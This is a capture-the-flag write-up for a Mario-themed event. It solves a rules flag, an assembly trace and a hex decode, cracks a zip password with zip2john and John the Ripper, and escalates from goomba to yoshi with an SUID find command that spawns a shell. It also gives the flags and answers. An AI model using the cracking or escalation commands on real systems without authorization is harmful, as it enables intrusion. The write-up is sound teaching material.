# Rules
If you go read our rules page and view the source (or highlight all text with CTRL+A), there is a flag hidden at the bottom of the page. 
`SILICON{n1c3_j0b_r34D1Ng_tH3_Ru135}`

# Assemble
code.asm contains Assembly instructions. You need to go step by step through the Assembly code to calculate the value of each register and ultimately find the value of `eax`.

[An online debugger](https://tracer.kringlecastle.com/) is a big help in visualizing each step.

Some key concepts
* Line 1 - xor anything on itself always returns 0
* Line 3 - ebx is 0 so decrementing it (aka subtract 1) causes the value to wrap around to 0xFFFFFFFF
* Line 7 - shl ecx, 2 means binary shift the value of ecx to left two places

After going through all the lines, the value of eax should be `0x0x00000032`
`SILICON{0x00000032}`

# Brute
We are given a flag.zip file. When we try to unzip it - `unzip flag.zip`, we see a flag.txt is contained inside but it is password protected.

Yoshi mentions that the password is one of Mario's enemies which we conviently have a list of in `marios-enemies.txt`. But there are 2,212 entries so it would be tedious to manually try each one. It would be best to find a tool that can help use brute-force the password using this wordlist.

Some Googling of popular password brute-forcing tools and enumration of the sytem leads us to finding that [John the Ripper](https://www.openwall.com/john/) is installed at `/usr/bin/john`

Further research into using john to crack zip files reveals the need to extract the password hash from the zip using a tool like `zip2john`. This is also convienently installed at `/usr/bin/zip2john`.

First, we extract the hash of the zip file and save it to a new file. `zip2john flag.zip > ziphash`

Then, we can use john with the wordlist and hash file to brute-force the password - `john -w marios-enemies.txt ziphash`. John will take each word from the wordlist, hash it using the same algorithm zip files use and check to see if the hash it generates matches the one in the file.

After some time, john is able to find the password `Magikoopa`. We can then use that password to unzip the file and get the flag.
`SILICON{cr4ck_j0k35_n0T_p455W0rD5}`

# Cipher

*Note: this challenge was supposed to require performing an XOR using the THE_KEY environment variable but paill put the wrong cipher in the message* 

Yoshi tells us there is a message left on this system but is encoded in some cipher. There is a hint in the message about finding a hex key.

```
4c 75 69 67 69 2c 20 49 27 76 65 20 6d 61 64 65 20 61 20 62 72 65 61 6b
74 68 72 6f 75 67 68 20 69 6e 20 6b 65 65 70 69 6e 67 20 70 69 70 65 73
20 66 72 6f 6d 20 63 6f 72 72 6f 64 69 6e 67 2e 20 43 6f 6d 65 20 6f 76
65 72 20 74 6f 20 74 68 65 20 63 61 73 74 6c 65 20 61 73 20 73 6f 6f 6e
20 79 6f 75 20 63 61 6e 21 0a 53 49 4c 49 43 4f 4e 7b 77 68 30 35 5f 63
30 30 4c 33 72 5f 6d 34 52 31 30 5f 78 30 72 5f 4c 75 31 67 31 3f 7d
```

This looks like hex!

We can use a tool like [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=NGMgNzUgNjkgNjcgNjkgMmMgMjAgNDkgMjcgNzYgNjUgMjAgNmQgNjEgNjQgNjUgMjAgNjEgMjAgNjIgNzIgNjUgNjEgNmIKNzQgNjggNzIgNmYgNzUgNjcgNjggMjAgNjkgNmUgMjAgNmIgNjUgNjUgNzAgNjkgNmUgNjcgMjAgNzAgNjkgNzAgNjUgNzMKMjAgNjYgNzIgNmYgNmQgMjAgNjMgNmYgNzIgNzIgNmYgNjQgNjkgNmUgNjcgMmUgMjAgNDMgNmYgNmQgNjUgMjAgNmYgNzYKNjUgNzIgMjAgNzQgNmYgMjAgNzQgNjggNjUgMjAgNjMgNjEgNzMgNzQgNmMgNjUgMjAgNjEgNzMgMjAgNzMgNmYgNmYgNmUKMjAgNzkgNmYgNzUgMjAgNjMgNjEgNmUgMjEgMGEgNTMgNDkgNGMgNDkgNDMgNGYgNGUgN2IgNzcgNjggMzAgMzUgNWYgNjMKMzAgMzAgNGMgMzMgNzIgNWYgNmQgMzQgNTIgMzEgMzAgNWYgNzggMzAgNzIgNWYgNGMgNzUgMzEgNjcgMzEgM2YgN2Q) to decode the message *From Hex* and we get a decoded message with the flag.

```
Luigi, I've made a breakthrough in keeping pipes from corroding. Come over to the castle as soon you can!
SILICON{wh05_c00L3r_m4R10_x0r_Lu1g1?}
```

# Takeover
We open the terminal and instead of seeing our favorite pal Yoshi, we are greeted with a Goomba. It talks about escalating things and getting back to Yoshi.

We can perform some enumeration on the system and find a few key pieces of information.
* We are running as the goomba user
    ```
    goomba@a265860372fb:~$ whoami
    goomba
    ```
* There is another user on the sytem, yoshi, but we can't read their home directory
    ```
    goomba@a265860372fb:~$ ls /home
    goomba  yoshi
    goomba@a265860372fb:~$ ls -la /home/yoshi
    ls: cannot open directory '/home/yoshi': Permission denied
    ```

From this info, it seems like we may want to attempt to escalate our privileges from the goomba user to the yoshi user. Here is a [helpful reference](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) for enumerating priv esc options.

Performing a search for binaries with the SUID bit set, we discover `/usr/local/bin/find`
```
goomba@a265860372fb:~$ find / -perm -u=s -type f 2>/dev/null
/usr/local/bin/find
/usr/bin/chsh
/usr/bin/umount
/usr/bin/su
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/newgrp
```

This find binary is owned by the user yoshi and has the SUID bit set.
```
goomba@a265860372fb:~$ ls -la /usr/local/bin/find 
-rwsr-xr-x 1 yoshi yoshi 282088 Jun  6 09:52 /usr/local/bin/find
```

Using a handy reference like [GTFOBins](https://gtfobins.github.io/gtfobins/find/#suid), we can see find can be used to escalate privileges to yoshi.
```
goomba@a265860372fb:~$ find . -exec /bin/sh -p \; -quit
$ whoami
yoshi
```

Looking in yoshi's home directory, we find the flag in yoshi_intro.txt
```
$ cat yoshi_intro.txt
───────────────████─███────────
──────────────██▒▒▒█▒▒▒█───────
─────────────██▒────────█──────
─────────██████──██─██──█──────
────────██████───██─██──█──────   Phew. Nice work finding me! I thought it was over after that goomba took over the system.
────────██▒▒▒█──────────███────   You earned this SILICON{5u1D_B1t_15_mY_f4v0R1t3_p3_t3cHn1qU3}
────────██▒▒▒▒▒▒───▒──██████───   - Yoshi
───────██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒███─
──────██▒▒▒▒─────▒▒▒▒▒▒▒▒▒▒▒▒█─     
──────██▒▒▒───────▒▒▒▒▒▒▒█▒█▒██     
───────██▒▒───────▒▒▒▒▒▒▒▒▒▒▒▒█    
────────██▒▒─────█▒▒▒▒▒▒▒▒▒▒▒▒█              
────────███▒▒───██▒▒▒▒▒▒▒▒▒▒▒▒█              
─────────███▒▒───█▒▒▒▒▒▒▒▒▒▒▒█─              
────────██▀█▒▒────█▒▒▒▒▒▒▒▒██──              
──────██▀██▒▒▒────█████████────              
────██▀███▒▒▒▒────█▒▒██────────              
█████████▒▒▒▒▒█───██──██───────              
█▒▒▒▒▒▒█▒▒▒▒▒█────████▒▒█──────               
█▒▒▒▒▒▒█▒▒▒▒▒▒█───███▒▒▒█──────
█▒▒▒▒▒▒█▒▒▒▒▒█────█▒▒▒▒▒█──────
██▒▒▒▒▒█▒▒▒▒▒▒█───█▒▒▒███──────
─██▒▒▒▒███████───██████────────
──██▒▒▒▒▒██─────██─────────────
───██▒▒▒██─────██──────────────
────█████─────███──────────────
────█████▄───█████▄────────────
──▄█▓▓▓▓▓█▄─█▓▓▓▓▓█▄───────────
──█▓▓▓▓▓▓▓▓██▓▓▓▓▓▓▓█──────────
──█▓▓▓▓▓▓▓▓██▓▓▓▓▓▓▓█──────────
──▀████████▀▀███████▀──────────
```